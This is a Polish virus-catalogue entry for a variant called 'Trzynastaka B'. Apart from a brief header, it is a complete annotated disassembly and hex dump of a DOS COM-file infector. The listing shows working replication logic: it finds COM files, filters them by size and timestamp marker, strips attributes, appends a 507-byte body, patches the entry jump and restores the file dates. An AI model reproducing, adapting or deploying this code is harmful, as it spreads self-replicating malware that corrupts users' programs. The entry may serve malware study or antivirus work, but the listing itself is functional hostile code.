

                           TRZYNASTAKA B

Nowa wersja wirusa. Przykleja 507 bajt¢w do plik¢w typu COM. Poni§sza wersja
zosta’a wyci‘ta z programu VIR.EXE J.Sobczyka. Dzia’anie takie samo jak wersji 
klasycznej (a).
   
3800 50            PUSH    AX
3801 BE5302        MOV     SI,0253
3804 8BD6          MOV     DX,SI
3806 81C60000      ADD     SI,0000
380A FC            CLD
380B B90300        MOV     CX,0003
380E BF0001        MOV     DI,0100
3811 F3            REPZ
3812 A4            MOVSB
3813 8BFA          MOV     DI,DX
3815 B430          MOV     AH,30                       ; '0'
3817 CD21          INT     21
3819 3C00          CMP     AL,00
381B 7503          JNZ     3820
381D E92501        JMP     3945
3820 BA2B00        MOV     DX,002B
3823 03D7          ADD     DX,DI
3825 8BDA          MOV     BX,DX
3827 B41A          MOV     AH,1A
3829 CD21          INT     21
382B 8BD7          MOV     DX,DI
382D 81C20600      ADD     DX,0006
3831 B90300        MOV     CX,0003
3834 B44E          MOV     AH,4E                       ; Find First
3836 CD21          INT     21
3838 E90400        JMP     383F
383B B44F          MOV     AH,4F                       ; Find Next
383D CD21          INT     21
383F 7303          JAE     3844
3841 E90101        JMP     3945
3844 8B4F16        MOV     CX,[BX+16]
3847 8B5718        MOV     DX,[BX+18]
384A 81E2E001      AND     DX,01E0
384E 81FAA001      CMP     DX,01A0
3852 74E7          JZ      383B
3854 817F1A00FA    CMP     WORD PTR [BX+1A],FA00
3859 77E0          JA      383B
385B 817F1A0001    CMP     WORD PTR [BX+1A],0100
3860 72D9          JB      383B
3862 57            PUSH    DI
3863 8BF3          MOV     SI,BX
3865 83C61E        ADD     SI,+1E
3868 81C71300      ADD     DI,0013
386C AC            LODSB
386D AA            STOSB
386E 3C00          CMP     AL,00
3870 75FA          JNZ     386C
3872 5F            POP     DI
3873 8BD7          MOV     DX,DI
3875 81C21300      ADD     DX,0013
3879 B80043        MOV     AX,4300
387C CD21          INT     21
387E 898D2100      MOV     [DI+0021],CX
3882 81E1FEFF      AND     CX,FFFE
3886 8BD7          MOV     DX,DI
3888 81C21300      ADD     DX,0013
388C B80143        MOV     AX,4301
388F CD21          INT     21
3891 8BD7          MOV     DX,DI
3893 81C21300      ADD     DX,0013
3897 B8023D        MOV     AX,3D02
389A CD21          INT     21
389C 7303          JAE     38A1
389E E99400        JMP     3935
38A1 8BD8          MOV     BX,AX
38A3 B80057        MOV     AX,5700
38A6 CD21          INT     21
38A8 898D2300      MOV     [DI+0023],CX
38AC 89952500      MOV     [DI+0025],DX
38B0 B43F          MOV     AH,3F                       ; '?'
38B2 B90300        MOV     CX,0003
38B5 8BD7          MOV     DX,DI
38B7 81C20000      ADD     DX,0000
38BB CD21          INT     21
38BD 7303          JAE     38C2
38BF E95A00        JMP     391C
38C2 3D0300        CMP     AX,0003
38C5 7555          JNZ     391C
38C7 B80242        MOV     AX,4202
38CA B90000        MOV     CX,0000
38CD 8BD1          MOV     DX,CX
38CF CD21          INT     21
38D1 2D0300        SUB     AX,0003
38D4 89850400      MOV     [DI+0004],AX
38D8 B94B01        MOV     CX,014B
38DB 83FA00        CMP     DX,+00
38DE 753C          JNZ     391C
38E0 8BD7          MOV     DX,DI
38E2 2BF9          SUB     DI,CX
38E4 83C702        ADD     DI,+02
38E7 050301        ADD     AX,0103
38EA 03C1          ADD     AX,CX
38EC 8905          MOV     [DI],AX
38EE B440          MOV     AH,40                       ; '@'
38F0 8BFA          MOV     DI,DX
38F2 2BD1          SUB     DX,CX
38F4 B9FB01        MOV     CX,01FB
38F7 CD21          INT     21
38F9 7303          JAE     38FE
38FB E91E00        JMP     391C
38FE 3DFB01        CMP     AX,01FB
3901 7519          JNZ     391C
3903 B80042        MOV     AX,4200
3906 B90000        MOV     CX,0000
3909 8BD1          MOV     DX,CX
390B CD21          INT     21
390D 720D          JB      391C
390F B440          MOV     AH,40                       ; '@'
3911 B90300        MOV     CX,0003
3914 8BD7          MOV     DX,DI
3916 81C20300      ADD     DX,0003
391A CD21          INT     21
391C 8B8D2300      MOV     CX,[DI+0023]
3920 8B952500      MOV     DX,[DI+0025]
3924 81E21FFE      AND     DX,FE1F
3928 81CAA001      OR      DX,01A0
392C B80157        MOV     AX,5701
392F CD21          INT     21
3931 B43E          MOV     AH,3E                       ; '>'
3933 CD21          INT     21
3935 B80043        MOV     AX,4300
3938 8B8D2100      MOV     CX,[DI+0021]
393C CD21          INT     21
393E BA8000        MOV     DX,0080
3941 B41A          MOV     AH,1A
3943 CD21          INT     21
3945 58            POP     AX
3946 BF0001        MOV     DI,0100
3949 57            PUSH    DI
394A C3            RET

394B E90000        JMP     394E
394E E9D862        JMP     9C29

3951     3F 3F 3F 3F 3F 3F 3F-3F 2E 43 4F 4D 00 43 4F    ????????.COM.CO
3960  4D 4D 41 4E 44 2E 43 4F-4D 00 00 00 20 00 C0 71   MMAND.COM... .@q
3970  90 0F 00 00 00 00 01 3F-3F 3F 3F 3F 3F 3F 3F 43   .......????????C
3980  4F 4D 03 04 00 00 00 00-00 00 00 20 C0 71 90 0F   OM......... @q..
3990  DB 62 00 00 43 4F 4D 4D-41 4E 44 2E 43 4F 4D 00   [b..COMMAND.COM.
39A0  00 6F 73 6F 66 74 79 72-69 67 68 74 20 4D 69 63   .osoftyright Mic
39B0  72 6F 73 6F 66 74 79 72-69 67 68 74 20 4D 69 63   rosoftyright Mic
39C0  72 6F 73 6F 66 74 79 72-69 67 68 74 20 4D 69 63   rosoftyright Mic
39D0  72 6F 73 6F 66 74 79 72-69 67 68 74 20 4D 69 63   rosoftyright Mic
39E0  72 6F 73 6F 66 74 79 72-69 67 68 74 20 4D 69 63   rosoftyright Mic
39F0  72 6F 73 6F 66 74 20 31-39 38 38                  rosoft 1988


